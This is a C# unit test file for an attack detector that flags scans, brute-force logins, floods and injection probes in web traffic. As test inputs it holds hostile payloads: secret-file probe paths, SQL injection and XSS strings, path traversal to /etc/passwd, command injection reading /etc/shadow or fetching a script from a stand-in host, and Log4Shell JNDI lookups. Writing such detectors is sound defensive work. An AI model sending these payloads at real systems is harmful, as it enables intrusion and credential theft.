using System.Net;
using Runova.ServerCore.Contracts;
using Runova.ServerCore.Traffic;

namespace Runova.ServerCore.Tests.Traffic;

/// <summary>
/// E110 T1: scans, brute force, floods and injection probes, each from sliding windows per address
/// (and per site for floods) held in bounded maps. Private, loopback and link-local addresses, the
/// allowlist and Cloudflare's own addresses are never flagged.
/// </summary>
public sealed class AttackDetectorTests
{
    private const long Start = 1_794_996_000_000;

    private static readonly AttackThresholds _defaults = new(20, 50, 5, 20, 5, 600, 5, 10);

    private static readonly UserAgentInfo _browser = new("Firefox", 133, "Windows", TrafficDevice.Desktop, null);

    private static TrafficRequest Request(
        string path = "/",
        string address = "203.0.113.7",
        TrafficMethod method = TrafficMethod.Get,
        int status = 200,
        long at = Start,
        string? query = null,
        string site = "app",
        bool suspiciousAgent = false) =>
        new(site, at, IpKey.FromAddress(IPAddress.Parse(address)), method, path, query, status, 100, 5, true, null, "app.test", _browser, new GeoResult("DE", CountrySource.DbIp, null, null), 1, suspiciousAgent);

    private static List<AttackHit> Feed(AttackDetector detector, IEnumerable<TrafficRequest> requests)
    {
        var hits = new List<AttackHit>();
        foreach (var request in requests)
        {
            detector.Observe(request, hits);
        }

        return hits;
    }

    private static AttackDetector Detector(AttackThresholds? thresholds = null, params string[] allowlist) =>
        new(thresholds ?? _defaults, [.. allowlist.Select(text => IpNetwork.TryParse(text, out var network) ? network : throw new ArgumentException(text))]);

    [Theory]
    [InlineData("/.env")]
    [InlineData("/app/.env")]
    [InlineData("/.git/config")]
    [InlineData("/wp-config.php.bak")]
    [InlineData("/phpmyadmin/index.php")]
    [InlineData("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php")]
    [InlineData("/.aws/credentials")]
    [InlineData("/server-status")]
    [InlineData("/actuator/env")]
    [InlineData("/cgi-bin/luci")]
    public void Probe_paths_are_a_scan_once_there_are_enough(string path)
    {
        var detector = Detector();

        var below = Feed(detector, Enumerable.Repeat(Request(path, status: 404), 19));
        var crossing = Feed(detector, [Request(path, status: 404)]);
        var after = Feed(detector, [Request(path, status: 404)]);

        Assert.Empty(below);
        var hit = Assert.Single(crossing);
        Assert.Equal((AttackKind.Scan, 20, "app"), (hit.Kind, hit.Count, hit.Site));
        Assert.Equal(1, Assert.Single(after).Count);
    }

    [Fact]
    public void Many_not_founds_from_one_address_are_a_scan()
    {
        var detector = Detector();

        var hits = Feed(detector, Enumerable.Range(0, 50).Select(i => Request($"/page-{i}", status: 404, at: Start + (i * 1000))));

        Assert.Equal(AttackKind.Scan, Assert.Single(hits).Kind);
    }

    [Fact]
    public void Hits_spread_wider_than_the_window_are_not_an_attack()
    {
        var detector = Detector();

        var hits = Feed(detector, Enumerable.Range(0, 40).Select(i => Request("/.env", status: 404, at: Start + (i * 20_000))));

        Assert.Empty(hits);
    }

    [Theory]
    [InlineData("/wp-login.php")]
    [InlineData("/xmlrpc.php")]
    [InlineData("/login")]
    [InlineData("/user/login")]
    [InlineData("/users/sign_in")]
    [InlineData("/api/auth/token")]
    [InlineData("/admin")]
    [InlineData("/administrator/index.php")]
    public void Posts_to_a_login_page_are_brute_force(string path)
    {
        var detector = Detector();

        var hits = Feed(detector, Enumerable.Range(0, 20).Select(i => Request(path, method: TrafficMethod.Post, status: 401, at: Start + (i * 1000))));

        Assert.Equal((AttackKind.BruteForce, 20), (Assert.Single(hits).Kind, hits[0].Count));
    }

    /// <summary>
    /// nginx (or the app behind it) decodes the path, merges slashes and resolves dot segments before
    /// it serves the page, so these all reach the login page and count as tries at it.
    /// </summary>
    [Theory]
    [InlineData("/%77p-login.php")]
    [InlineData("/wp%2Dlogin.php")]
    [InlineData("//wp-login.php")]
    [InlineData("/./wp-login.php")]
    [InlineData("/blog/../wp-login.php")]
    [InlineData("/%2E/xmlrpc.php")]
    public void Posts_to_another_spelling_of_a_login_page_are_brute_force_too(string path)
    {
        var detector = Detector();

        var hits = Feed(detector, Enumerable.Range(0, 20).Select(i => Request(path, method: TrafficMethod.Post, status: 401, at: Start + (i * 1000))));

        // A dot segment also reads as path traversal, which is a hit of its own.
        Assert.Contains(hits, hit => hit.Kind == AttackKind.BruteForce);
    }

    [Theory]
    [InlineData("/%2Eenv")]
    [InlineData("//.git/config")]
    [InlineData("/assets/../.env")]
    [InlineData("/%2Fserver-status")]
    public void Another_spelling_of_a_probe_is_a_probe(string path)
    {
        var detector = Detector();

        var hits = Feed(detector, Enumerable.Range(0, 20).Select(i => Request(path, status: 200, at: Start + (i * 1000))));

        Assert.Contains(hits, hit => hit.Kind == AttackKind.Scan);
    }

    [Theory]
    [InlineData("/login", "Get")]
    [InlineData("/loginhelp", "Post")]
    [InlineData("/blog/admin-tips", "Post")]
    [InlineData("/api/orders", "Post")]
    public void Other_requests_are_not_brute_force(string path, string method)
    {
        var detector = Detector();

        Assert.Empty(Feed(detector, Enumerable.Repeat(Request(path, method: Enum.Parse<TrafficMethod>(method)), 30)));
    }

    [Fact]
    public void One_address_over_the_rate_is_a_flood()
    {
        var detector = Detector();

        var hits = Feed(detector, Enumerable.Range(0, 600).Select(i => Request($"/item/{i}", at: Start + (i * 50))));

        var hit = Assert.Single(hits);
        Assert.Equal((AttackKind.Flood, 600, false), (hit.Kind, hit.Count, hit.SiteWide));
    }

    [Fact]
    public void A_site_far_above_its_usual_rate_is_a_flood_from_everyone()
    {
        var detector = Detector(_defaults with { FloodRequestsPerMinute = 100 });
        var minute = 60_000L;
        // An hour at five requests a minute, from many addresses.
        var hits = Feed(detector, Enumerable.Range(0, 60 * 5).Select(i => Request(address: $"198.51.100.{(i % 200) + 1}", at: Start + (i / 5 * minute) + (i % 5 * 1000))));
        Assert.Empty(hits);

        // Then a minute of 110 requests spread over 110 addresses: none over the per-address rate.
        var flood = Feed(detector, Enumerable.Range(0, 110).Select(i => Request(address: $"192.0.2.{i + 1}", at: Start + (61 * minute) + (i * 100))));

        Assert.NotEmpty(flood);
        Assert.All(flood, hit => Assert.True(hit is { Kind: AttackKind.Flood, SiteWide: true }));
    }

    [Theory]
    [InlineData("/search", "q=1%27%20UNION%20SELECT%20username,password%20FROM%20users--")]
    [InlineData("/item", "id=1%20or%201=1--")]
    [InlineData("/item", "id=1;waitfor%20delay%20%270:0:5%27")]
    [InlineData("/item", "id=1%2bAND%2bSLEEP(5)")]
    [InlineData("/item", "id=1/**/union/**/select/**/1,2")]
    [InlineData("/search", "q=%3Cscript%3Ealert(1)%3C/script%3E")]
    [InlineData("/search", "q=%253Cscript%253E")]
    [InlineData("/page", "next=javascript:alert(document.cookie)")]
    [InlineData("/download", "file=../../../../etc/passwd")]
    [InlineData("/download", "file=..%2f..%2f..%2fetc%2fpasswd")]
    [InlineData("/static/..%5c..%5cwindows%5cwin.ini", null)]
    [InlineData("/ping", "host=127.0.0.1;cat%20/etc/shadow")]
    [InlineData("/ping", "host=$(wget%20http://evil.test/x.sh)")]
    [InlineData("/x", "a=${jndi:ldap://evil.test/a}")]
    [InlineData("/x", "a=$%7Bjndi:ldap://evil.test/a%7D")]
    public void Injection_probes_are_found_in_the_decoded_path_and_query(string path, string? query)
    {
        Assert.True(AttackDetector.LooksLikeInjection(path, query));
    }

    [Theory]
    [InlineData("/", null)]
    [InlineData("/blog/how-to-select-a-union-rep", null)]
    [InlineData("/search", "q=rock+and+roll")]
    [InlineData("/search", "q=select%20your%20plan")]
    [InlineData("/docs/v1.2/api", "page=2&sort=desc")]
    [InlineData("/products", "filter=price%3E100")]
    [InlineData("/a.b.c/file.tar.gz", null)]
    public void Ordinary_requests_are_not_injection(string path, string? query)
    {
        Assert.False(AttackDetector.LooksLikeInjection(path, query));
    }

    [Fact]
    public void Enough_injection_probes_from_one_address_are_an_attack_and_so_is_a_log4shell_agent()
    {
        var detector = Detector();

        var hits = Feed(detector, Enumerable.Range(0, 4).Select(i => Request("/x", query: "id=1%20or%201=1--", at: Start + i))
            .Append(Request("/", suspiciousAgent: true, at: Start + 10)));

        Assert.Equal((AttackKind.Injection, 5), (Assert.Single(hits).Kind, hits[0].Count));
    }

    [Theory]
    [InlineData("10.0.0.8")]
    [InlineData("192.168.1.20")]
    [InlineData("127.0.0.1")]
    [InlineData("::1")]
    [InlineData("fe80::1")]
    [InlineData("203.0.113.7")]
    [InlineData("172.70.4.4")]
    public void Local_allowlisted_and_cloudflare_addresses_are_never_flagged(string address)
    {
        var detector = Detector(null, "203.0.113.0/24");

        var hits = Feed(detector, Enumerable.Repeat(Request("/.env", address: address, status: 404), 100));

        Assert.Empty(hits);
    }

    [Fact]
    public void An_ipv6_attacker_moving_around_its_64_is_one_visitor_and_ipv4_stays_per_address()
    {
        var detector = Detector();

        var hits = Feed(detector, Enumerable.Range(1, 100).Select(i => Request("/wp-login.php", address: $"2001:db8:2::{i:x}", method: TrafficMethod.Post, at: Start + (i * 1000))));
        var v4 = Feed(detector, Enumerable.Range(1, 19).Select(i => Request("/wp-login.php", address: $"198.51.100.{i}", method: TrafficMethod.Post, at: Start + (i * 1000))));

        Assert.All(hits, hit => Assert.Equal((AttackKind.BruteForce, IpKey.FromAddress(IPAddress.Parse("2001:db8:2::"))), (hit.Kind, hit.Address)));
        Assert.Equal(81, hits.Count);
        Assert.Equal(20, hits[0].Count);
        Assert.Empty(v4);
        Assert.Equal("2001:db8:2::/64", hits[0].Address.Visitor.Text);
        Assert.Equal("198.51.100.7", IpKey.FromAddress(IPAddress.Parse("198.51.100.7")).Visitor.Text);
    }

    [Fact]
    public void Each_site_counts_on_its_own()
    {
        var detector = Detector();

        var hits = Feed(detector, Enumerable.Range(0, 20).Select(i => Request("/.env", status: 404, site: i % 2 == 0 ? "app" : "blog")));

        Assert.Empty(hits);
    }

    [Fact]
    public void The_addresses_followed_stay_bounded()
    {
        var detector = new AttackDetector(_defaults, [], capacity: 100);

        Feed(detector, Enumerable.Range(0, 1000).Select(i => Request("/.env", address: $"198.51.{i / 250}.{(i % 250) + 1}", status: 404)));

        Assert.Equal(100, detector.Tracked);
        Assert.Equal(50_000, AttackDetector.DefaultCapacity);
    }
}
